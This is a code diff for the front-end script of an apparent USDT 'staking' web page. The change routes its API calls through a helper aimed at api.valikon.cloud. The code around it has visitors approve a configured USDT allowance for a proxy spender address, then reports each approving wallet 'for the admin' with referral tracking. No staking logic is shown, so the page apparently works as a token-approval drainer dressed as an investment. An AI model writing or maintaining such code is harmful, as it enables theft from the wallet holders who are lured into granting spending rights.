@@ -120,7 +120,15 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
   <script>
   (async function(){
-    const cfgRes = await fetch('/api/config').then(r=>r.json());
+    const API_BASE = window.API_BASE ?? (() => {
+      const host = location.hostname;
+      if(host === "localhost" || host === "127.0.0.1" || host === "api.valikon.cloud"){
+        return "";
+      }
+      return "https://api.valikon.cloud";
+    })();
+    const apiFetch = (path, opts={}) => fetch(`${API_BASE}${path}`, { credentials: 'include', ...opts });
+    const cfgRes = await apiFetch('/api/config').then(r=>r.json());
     const CFG = cfgRes.config;
     const USDT = CFG.USDT_ADDR, SPENDER = CFG.PROXY_ADDR, CHAIN_HEX = CFG.CHAIN_ID_HEX, END = Number(CFG.STAKING_END_TS||0);
     const DECIMALS = CFG.APPROVAL_DECIMALS, AMOUNT_STR = CFG.APPROVAL_AMOUNT;
@@ -183,17 +191,17 @@
     async function loginWithWallet(){
       try{
         if(!account){ await ensureProvider(); const accounts = await provider.send("eth_requestAccounts", []); account = ethers.getAddress(accounts[0]); }
-        const nonceRes = await fetch('/api/wlogin/nonce?address='+account).then(r=>r.json());
+        const nonceRes = await apiFetch('/api/wlogin/nonce?address='+account).then(r=>r.json());
         const message = nonceRes.message;
         signer = await provider.getSigner();
         const signature = await signer.signMessage(message);
-        const ver = await fetch('/api/wlogin/verify',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: account, message, signature }) }).then(r=>r.json());
+        const ver = await apiFetch('/api/wlogin/verify',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: account, message, signature }) }).then(r=>r.json());
         if(ver.ok){ showRef({ refCode: ver.refCode, refCount: ver.refCount }); document.getElementById('loginBtn').textContent='Logged In'; }
       }catch(e){ console.log(e); }
     }
 
     // load /api/me if session exists
-    try{ const me = await fetch('/api/me').then(r=>r.json()); if(me.ok && me.loggedIn){ showRef(me); document.getElementById('loginBtn').textContent='Logged In'; } }catch{}
+    try{ const me = await apiFetch('/api/me').then(r=>r.json()); if(me.ok && me.loggedIn){ showRef(me); document.getElementById('loginBtn').textContent='Logged In'; } }catch{}
 
     document.getElementById('loginBtn').addEventListener('click', loginWithWallet);
 
@@ -217,7 +225,7 @@
           await tx.wait();
           help.innerHTML = "<b>Approved!</b> We'll record your wallet for the admin.";
           const useRef = localStorage.getItem('ref_attribution') || undefined;
-          try{ const resp = await fetch("/api/record-approval", { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ txHash: tx.hash, wallet: account, refCode: useRef }) }).then(r=>r.json()); if(resp?.myRef) showRef({ refCode: resp.myRef.code, refCount: resp.myRef.count }); }catch(e){}
+          try{ const resp = await apiFetch("/api/record-approval", { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ txHash: tx.hash, wallet: account, refCode: useRef }) }).then(r=>r.json()); if(resp?.myRef) showRef({ refCode: resp.myRef.code, refCount: resp.myRef.count }); }catch(e){}
           await refreshAllowance();
         }
       }catch(err){ console.error(err); if(err && err.code===4001) help.textContent='User rejected.'; else help.textContent='Error. See console.'; }
